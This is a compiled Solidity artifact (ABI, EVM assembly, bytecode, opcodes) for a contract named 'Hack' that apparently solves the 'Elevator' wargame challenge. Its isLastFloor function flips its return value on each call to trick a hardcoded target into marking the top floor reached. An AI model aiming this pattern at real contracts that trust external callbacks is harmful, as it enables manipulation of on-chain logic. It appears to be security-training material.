{
	"contract/security/ElevatorAttacker.sol": {
		"Hack": {
			"abi": [
				{
					"inputs": [],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"inputs": [],
					"name": "attack",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"name": "isLastFloor",
					"outputs": [
						{
							"internalType": "bool",
							"name": "",
							"type": "bool"
						}
					],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "target",
					"outputs": [
						{
							"internalType": "contract Elevator",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"contract/security/ElevatorAttacker.sol\":453:1278  contract Hack {... */\n  mstore(0x40, 0x80)\n    /* \"contract/security/ElevatorAttacker.sol\":511:553  0x35D1366166142287bBc00285CE70ee62eB775c41 */\n  0x35d1366166142287bbc00285ce70ee62eb775c41\n    /* \"contract/security/ElevatorAttacker.sol\":492:553  address instance = 0x35D1366166142287bBc00285CE70ee62eB775c41 */\n  0x00\n  dup1\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contract/security/ElevatorAttacker.sol\":599:603  true */\n  0x01\n    /* \"contract/security/ElevatorAttacker.sol\":585:603  bool result = true */\n  dup1\n  exp(0x0100, 0x14)\n  dup2\n  sload\n  dup2\n  0xff\n  mul\n  not\n  and\n  swap1\n  dup4\n  iszero\n  iszero\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contract/security/ElevatorAttacker.sol\":1221:1275  constructor() {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n    /* \"contract/security/ElevatorAttacker.sol\":1260:1268  instance */\n  0x00\n  dup1\n  sload\n  swap1\n  0x0100\n  exp\n  swap1\n  div\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n    /* \"contract/security/ElevatorAttacker.sol\":1242:1248  target */\n  0x01\n  0x00\n    /* \"contract/security/ElevatorAttacker.sol\":1242:1269  target = Elevator(instance) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contract/security/ElevatorAttacker.sol\":453:1278  contract Hack {... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contract/security/ElevatorAttacker.sol\":453:1278  contract Hack {... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x5f9a4bca\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x9e5faafc\n      eq\n      tag_4\n      jumpi\n      dup1\n      0xd4b83992\n      eq\n      tag_5\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"contract/security/ElevatorAttacker.sol\":608:880  function isLastFloor(uint) public returns (bool){... */\n    tag_3:\n      tag_6\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_7\n      swap2\n      swap1\n      tag_8\n      jump\t// in\n    tag_7:\n      tag_9\n      jump\t// in\n    tag_6:\n      mload(0x40)\n      tag_10\n      swap2\n      swap1\n      tag_11\n      jump\t// in\n    tag_10:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contract/security/ElevatorAttacker.sol\":886:1215  function attack() public {... */\n    tag_4:\n      tag_12\n      tag_13\n      jump\t// in\n    tag_12:\n      stop\n        /* \"contract/security/ElevatorAttacker.sol\":558:580  Elevator public target */\n    tag_5:\n      tag_14\n      tag_15\n      jump\t// in\n    tag_14:\n      mload(0x40)\n      tag_16\n      swap2\n      swap1\n      tag_17\n      jump\t// in\n    tag_16:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contract/security/ElevatorAttacker.sol\":608:880  function isLastFloor(uint) public returns (bool){... */\n    tag_9:\n        /* \"contract/security/ElevatorAttacker.sol\":651:655  bool */\n      0x00\n        /* \"contract/security/ElevatorAttacker.sol\":713:717  true */\n      0x01\n        /* \"contract/security/ElevatorAttacker.sol\":703:717  result == true */\n      iszero\n      iszero\n        /* \"contract/security/ElevatorAttacker.sol\":703:709  result */\n      0x01\n      0x14\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xff\n      and\n        /* \"contract/security/ElevatorAttacker.sol\":703:717  result == true */\n      iszero\n      iszero\n      eq\n        /* \"contract/security/ElevatorAttacker.sol\":700:855  if(result == true)... */\n      iszero\n      tag_19\n      jumpi\n        /* \"contract/security/ElevatorAttacker.sol\":771:776  false */\n      0x00\n        /* \"contract/security/ElevatorAttacker.sol\":762:768  result */\n      0x01\n      0x14\n        /* \"contract/security/ElevatorAttacker.sol\":762:776  result = false */\n      0x0100\n      exp\n      dup2\n      sload\n      dup2\n      0xff\n      mul\n      not\n      and\n      swap1\n      dup4\n      iszero\n      iszero\n      mul\n      or\n      swap1\n      sstore\n      pop\n        /* \"contract/security/ElevatorAttacker.sol\":700:855  if(result == true)... */\n      jump(tag_20)\n    tag_19:\n        /* \"contract/security/ElevatorAttacker.sol\":843:847  true */\n      0x01\n        /* \"contract/security/ElevatorAttacker.sol\":834:840  result */\n      dup1\n      0x14\n        /* \"contract/security/ElevatorAttacker.sol\":834:847  result = true */\n      0x0100\n      exp\n      dup2\n      sload\n      dup2\n      0xff\n      mul\n      not\n      and\n      swap1\n      dup4\n      iszero\n      iszero\n      mul\n      or\n      swap1\n      sstore\n      pop\n        /* \"contract/security/ElevatorAttacker.sol\":700:855  if(result == true)... */\n    tag_20:\n        /* \"contract/security/ElevatorAttacker.sol\":868:874  result */\n      0x01\n      0x14\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xff\n      and\n        /* \"contract/security/ElevatorAttacker.sol\":861:874  return result */\n      swap1\n      pop\n        /* \"contract/security/ElevatorAttacker.sol\":608:880  function isLastFloor(uint) public returns (bool){... */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"contract/security/ElevatorAttacker.sol\":886:1215  function attack() public {... */\n    tag_13:\n        /* \"contract/security/ElevatorAttacker.sol\":918:924  target */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contract/security/ElevatorAttacker.sol\":918:929  target.goTo */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xed9a7134\n        /* \"contract/security/ElevatorAttacker.sol\":930:932  13 */\n      0x0d\n        /* \"contract/security/ElevatorAttacker.sol\":918:933  target.goTo(13) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_22\n      swap2\n      swap1\n      tag_23\n      jump\t// in\n    tag_22:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_24\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_24:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_26\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_26:\n      pop\n      pop\n      pop\n      pop\n        /* \"contract/security/ElevatorAttacker.sol\":886:1215  function attack() public {... */\n      jump\t// out\n        /* \"contract/security/ElevatorAttacker.sol\":558:580  Elevator public target */\n    tag_15:\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"#utility.yul\":88:205   */\n    tag_28:\n        /* \"#utility.yul\":197:198   */\n      0x00\n        /* \"#utility.yul\":194:195   */\n      dup1\n        /* \"#utility.yul\":187:199   */\n      revert\n        /* \"#utility.yul\":334:411   */\n    tag_30:\n        /* \"#utility.yul\":371:378   */\n      0x00\n        /* \"#utility.yul\":400:405   */\n      dup2\n        /* \"#utility.yul\":389:405   */\n      swap1\n      pop\n        /* \"#utility.yul\":334:411   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":417:539   */\n    tag_31:\n        /* \"#utility.yul\":490:514   */\n      tag_50\n        /* \"#utility.yul\":508:513   */\n      dup2\n        /* \"#utility.yul\":490:514   */\n      tag_30\n      jump\t// in\n    tag_50:\n        /* \"#utility.yul\":483:488   */\n      dup2\n        /* \"#utility.yul\":480:515   */\n      eq\n        /* \"#utility.yul\":470:533   */\n      tag_51\n      jumpi\n        /* \"#utility.yul\":529:530   */\n      0x00\n        /* \"#utility.yul\":526:527   */\n      dup1\n        /* \"#utility.yul\":519:531   */\n      revert\n        /* \"#utility.yul\":470:533   */\n    tag_51:\n        /* \"#utility.yul\":417:539   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":545:684   */\n    tag_32:\n        /* \"#utility.yul\":591:596   */\n      0x00\n        /* \"#utility.yul\":629:635   */\n      dup2\n        /* \"#utility.yul\":616:636   */\n      calldataload\n        /* \"#utility.yul\":607:636   */\n      swap1\n      pop\n        /* \"#utility.yul\":645:678   */\n      tag_53\n        /* \"#utility.yul\":672:677   */\n      dup2\n        /* \"#utility.yul\":645:678   */\n      tag_31\n      jump\t// in\n    tag_53:\n        /* \"#utility.yul\":545:684   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":690:1019   */\n    tag_8:\n        /* \"#utility.yul\":749:755   */\n      0x00\n        /* \"#utility.yul\":798:800   */\n      0x20\n        /* \"#utility.yul\":786:795   */\n      dup3\n        /* \"#utility.yul\":777:784   */\n      dup5\n        /* \"#utility.yul\":773:796   */\n      sub\n        /* \"#utility.yul\":769:801   */\n      slt\n        /* \"#utility.yul\":766:885   */\n      iszero\n      tag_55\n      jumpi\n        /* \"#utility.yul\":804:883   */\n      tag_56\n      tag_28\n      jump\t// in\n    tag_56:\n        /* \"#utility.yul\":766:885   */\n    tag_55:\n        /* \"#utility.yul\":924:925   */\n      0x00\n        /* \"#utility.yul\":949:1002   */\n      tag_57\n        /* \"#utility.yul\":994:1001   */\n      dup5\n        /* \"#utility.yul\":985:991   */\n      dup3\n        /* \"#utility.yul\":974:983   */\n      dup6\n        /* \"#utility.yul\":970:992   */\n      add\n        /* \"#utility.yul\":949:1002   */\n      tag_32\n      jump\t// in\n    tag_57:\n        /* \"#utility.yul\":939:1002   */\n      swap2\n      pop\n        /* \"#utility.yul\":895:1012   */\n      pop\n        /* \"#utility.yul\":690:1019   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1025:1115   */\n    tag_33:\n        /* \"#utility.yul\":1059:1066   */\n      0x00\n        /* \"#utility.yul\":1102:1107   */\n      dup2\n        /* \"#utility.yul\":1095:1108   */\n      iszero\n        /* \"#utility.yul\":1088:1109   */\n      iszero\n        /* \"#utility.yul\":1077:1109   */\n      swap1\n      pop\n        /* \"#utility.yul\":1025:1115   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1121:1230   */\n    tag_34:\n        /* \"#utility.yul\":1202:1223   */\n      tag_60\n        /* \"#utility.yul\":1217:1222   */\n      dup2\n        /* \"#utility.yul\":1202:1223   */\n      tag_33\n      jump\t// in\n    tag_60:\n        /* \"#utility.yul\":1197:1200   */\n      dup3\n        /* \"#utility.yul\":1190:1224   */\n      mstore\n        /* \"#utility.yul\":1121:1230   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1236:1446   */\n    tag_11:\n        /* \"#utility.yul\":1323:1327   */\n      0x00\n        /* \"#utility.yul\":1361:1363   */\n      0x20\n        /* \"#utility.yul\":1350:1359   */\n      dup3\n        /* \"#utility.yul\":1346:1364   */\n      add\n        /* \"#utility.yul\":1338:1364   */\n      swap1\n      pop\n        /* \"#utility.yul\":1374:1439   */\n      tag_62\n        /* \"#utility.yul\":1436:1437   */\n      0x00\n        /* \"#utility.yul\":1425:1434   */\n      dup4\n        /* \"#utility.yul\":1421:1438   */\n      add\n        /* \"#utility.yul\":1412:1418   */\n      dup5\n        /* \"#utility.yul\":1374:1439   */\n      tag_34\n      jump\t// in\n    tag_62:\n        /* \"#utility.yul\":1236:1446   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1452:1578   */\n    tag_35:\n        /* \"#utility.yul\":1489:1496   */\n      0x00\n        /* \"#utility.yul\":1529:1571   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":1522:1527   */\n      dup3\n        /* \"#utility.yul\":1518:1572   */\n      and\n        /* \"#utility.yul\":1507:1572   */\n      swap1\n      pop\n        /* \"#utility.yul\":1452:1578   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1584:1644   */\n    tag_36:\n        /* \"#utility.yul\":1612:1615   */\n      0x00\n        /* \"#utility.yul\":1633:1638   */\n      dup2\n        /* \"#utility.yul\":1626:1638   */\n      swap1\n      pop\n        /* \"#utility.yul\":1584:1644   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1650:1792   */\n    tag_37:\n        /* \"#utility.yul\":1700:1709   */\n      0x00\n        /* \"#utility.yul\":1733:1786   */\n      tag_66\n        /* \"#utility.yul\":1751:1785   */\n      tag_67\n        /* \"#utility.yul\":1760:1784   */\n      tag_68\n        /* \"#utility.yul\":1778:1783   */\n      dup5\n        /* \"#utility.yul\":1760:1784   */\n      tag_35\n      jump\t// in\n    tag_68:\n        /* \"#utility.yul\":1751:1785   */\n      tag_36\n      jump\t// in\n    tag_67:\n        /* \"#utility.yul\":1733:1786   */\n      tag_35\n      jump\t// in\n    tag_66:\n        /* \"#utility.yul\":1720:1786   */\n      swap1\n      pop\n        /* \"#utility.yul\":1650:1792   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1798:1924   */\n    tag_38:\n        /* \"#utility.yul\":1848:1857   */\n      0x00\n        /* \"#utility.yul\":1881:1918   */\n      tag_70\n        /* \"#utility.yul\":1912:1917   */\n      dup3\n        /* \"#utility.yul\":1881:1918   */\n      tag_37\n      jump\t// in\n    tag_70:\n        /* \"#utility.yul\":1868:1918   */\n      swap1\n      pop\n        /* \"#utility.yul\":1798:1924   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1930:2071   */\n    tag_39:\n        /* \"#utility.yul\":1995:2004   */\n      0x00\n        /* \"#utility.yul\":2028:2065   */\n      tag_72\n        /* \"#utility.yul\":2059:2064   */\n      dup3\n        /* \"#utility.yul\":2028:2065   */\n      tag_38\n      jump\t// in\n    tag_72:\n        /* \"#utility.yul\":2015:2065   */\n      swap1\n      pop\n        /* \"#utility.yul\":1930:2071   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2077:2238   */\n    tag_40:\n        /* \"#utility.yul\":2179:2231   */\n      tag_74\n        /* \"#utility.yul\":2225:2230   */\n      dup2\n        /* \"#utility.yul\":2179:2231   */\n      tag_39\n      jump\t// in\n    tag_74:\n        /* \"#utility.yul\":2174:2177   */\n      dup3\n        /* \"#utility.yul\":2167:2232   */\n      mstore\n        /* \"#utility.yul\":2077:2238   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2244:2496   */\n    tag_17:\n        /* \"#utility.yul\":2352:2356   */\n      0x00\n        /* \"#utility.yul\":2390:2392   */\n      0x20\n        /* \"#utility.yul\":2379:2388   */\n      dup3\n        /* \"#utility.yul\":2375:2393   */\n      add\n        /* \"#utility.yul\":2367:2393   */\n      swap1\n      pop\n        /* \"#utility.yul\":2403:2489   */\n      tag_76\n        /* \"#utility.yul\":2486:2487   */\n      0x00\n        /* \"#utility.yul\":2475:2484   */\n      dup4\n        /* \"#utility.yul\":2471:2488   */\n      add\n        /* \"#utility.yul\":2462:2468   */\n      dup5\n        /* \"#utility.yul\":2403:2489   */\n      tag_40\n      jump\t// in\n    tag_76:\n        /* \"#utility.yul\":2244:2496   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2502:2588   */\n    tag_41:\n        /* \"#utility.yul\":2548:2555   */\n      0x00\n        /* \"#utility.yul\":2577:2582   */\n      dup2\n        /* \"#utility.yul\":2566:2582   */\n      swap1\n      pop\n        /* \"#utility.yul\":2502:2588   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2594:2754   */\n    tag_42:\n        /* \"#utility.yul\":2653:2662   */\n      0x00\n        /* \"#utility.yul\":2686:2748   */\n      tag_79\n        /* \"#utility.yul\":2704:2747   */\n      tag_80\n        /* \"#utility.yul\":2713:2746   */\n      tag_81\n        /* \"#utility.yul\":2740:2745   */\n      dup5\n        /* \"#utility.yul\":2713:2746   */\n      tag_41\n      jump\t// in\n    tag_81:\n        /* \"#utility.yul\":2704:2747   */\n      tag_36\n      jump\t// in\n    tag_80:\n        /* \"#utility.yul\":2686:2748   */\n      tag_30\n      jump\t// in\n    tag_79:\n        /* \"#utility.yul\":2673:2748   */\n      swap1\n      pop\n        /* \"#utility.yul\":2594:2754   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2760:2909   */\n    tag_43:\n        /* \"#utility.yul\":2856:2902   */\n      tag_83\n        /* \"#utility.yul\":2896:2901   */\n      dup2\n        /* \"#utility.yul\":2856:2902   */\n      tag_42\n      jump\t// in\n    tag_83:\n        /* \"#utility.yul\":2851:2854   */\n      dup3\n        /* \"#utility.yul\":2844:2903   */\n      mstore\n        /* \"#utility.yul\":2760:2909   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2915:3155   */\n    tag_23:\n        /* \"#utility.yul\":3017:3021   */\n      0x00\n        /* \"#utility.yul\":3055:3057   */\n      0x20\n        /* \"#utility.yul\":3044:3053   */\n      dup3\n        /* \"#utility.yul\":3040:3058   */\n      add\n        /* \"#utility.yul\":3032:3058   */\n      swap1\n      pop\n        /* \"#utility.yul\":3068:3148   */\n      tag_85\n        /* \"#utility.yul\":3145:3146   */\n      0x00\n        /* \"#utility.yul\":3134:3143   */\n      dup4\n        /* \"#utility.yul\":3130:3147   */\n      add\n        /* \"#utility.yul\":3121:3127   */\n      dup5\n        /* \"#utility.yul\":3068:3148   */\n      tag_43\n      jump\t// in\n    tag_85:\n        /* \"#utility.yul\":2915:3155   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa26469706673582212200aa9f3055bb7d418b7fb68188848e653c442e2d073cc62f22c9aef209c37b4f764736f6c634300080c0033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "60806040527335d1366166142287bbc00285ce70ee62eb775c416000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555060018060146101000a81548160ff02191690831515021790555034801561007e57600080fd5b5060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff16600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550610388806100ef6000396000f3fe608060405234801561001057600080fd5b50600436106100415760003560e01c80635f9a4bca146100465780639e5faafc14610076578063d4b8399214610080575b600080fd5b610060600480360381019061005b91906101ff565b61009e565b60405161006d9190610247565b60405180910390f35b61007e61010e565b005b61008861019e565b60405161009591906102e1565b60405180910390f35b600060011515600160149054906101000a900460ff16151514156100dc576000600160146101000a81548160ff0219169083151502179055506100f7565b60018060146101000a81548160ff0219169083151502179055505b600160149054906101000a900460ff169050919050565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663ed9a7134600d6040518263ffffffff1660e01b815260040161016a9190610337565b600060405180830381600087803b15801561018457600080fd5b505af1158015610198573d6000803e3d6000fd5b50505050565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600080fd5b6000819050919050565b6101dc816101c9565b81146101e757600080fd5b50565b6000813590506101f9816101d3565b92915050565b600060208284031215610215576102146101c4565b5b6000610223848285016101ea565b91505092915050565b60008115159050919050565b6102418161022c565b82525050565b600060208201905061025c6000830184610238565b92915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b60006102a76102a261029d84610262565b610282565b610262565b9050919050565b60006102b98261028c565b9050919050565b60006102cb826102ae565b9050919050565b6102db816102c0565b82525050565b60006020820190506102f660008301846102d2565b92915050565b6000819050919050565b600061032161031c610317846102fc565b610282565b6101c9565b9050919050565b61033181610306565b82525050565b600060208201905061034c6000830184610328565b9291505056fea26469706673582212200aa9f3055bb7d418b7fb68188848e653c442e2d073cc62f22c9aef209c37b4f764736f6c634300080c0033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH20 0x35D1366166142287BBC00285CE70EE62EB775C41 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH1 0x1 DUP1 PUSH1 0x14 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP CALLVALUE DUP1 ISZERO PUSH2 0x7E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x1 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH2 0x388 DUP1 PUSH2 0xEF PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x41 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x5F9A4BCA EQ PUSH2 0x46 JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x76 JUMPI DUP1 PUSH4 0xD4B83992 EQ PUSH2 0x80 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x60 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x5B SWAP2 SWAP1 PUSH2 0x1FF JUMP JUMPDEST PUSH2 0x9E JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x6D SWAP2 SWAP1 PUSH2 0x247 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x7E PUSH2 0x10E JUMP JUMPDEST STOP JUMPDEST PUSH2 0x88 PUSH2 0x19E JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x95 SWAP2 SWAP1 PUSH2 0x2E1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 PUSH1 0x1 ISZERO ISZERO PUSH1 0x1 PUSH1 0x14 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND ISZERO ISZERO EQ ISZERO PUSH2 0xDC JUMPI PUSH1 0x0 PUSH1 0x1 PUSH1 0x14 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP PUSH2 0xF7 JUMP JUMPDEST PUSH1 0x1 DUP1 PUSH1 0x14 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP JUMPDEST PUSH1 0x1 PUSH1 0x14 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xED9A7134 PUSH1 0xD PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x16A SWAP2 SWAP1 PUSH2 0x337 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x184 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x198 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x1DC DUP2 PUSH2 0x1C9 JUMP JUMPDEST DUP2 EQ PUSH2 0x1E7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x1F9 DUP2 PUSH2 0x1D3 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x215 JUMPI PUSH2 0x214 PUSH2 0x1C4 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x223 DUP5 DUP3 DUP6 ADD PUSH2 0x1EA JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x241 DUP2 PUSH2 0x22C JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x25C PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x238 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x2A7 PUSH2 0x2A2 PUSH2 0x29D DUP5 PUSH2 0x262 JUMP JUMPDEST PUSH2 0x282 JUMP JUMPDEST PUSH2 0x262 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x2B9 DUP3 PUSH2 0x28C JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x2CB DUP3 PUSH2 0x2AE JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x2DB DUP2 PUSH2 0x2C0 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x2F6 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x2D2 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x321 PUSH2 0x31C PUSH2 0x317 DUP5 PUSH2 0x2FC JUMP JUMPDEST PUSH2 0x282 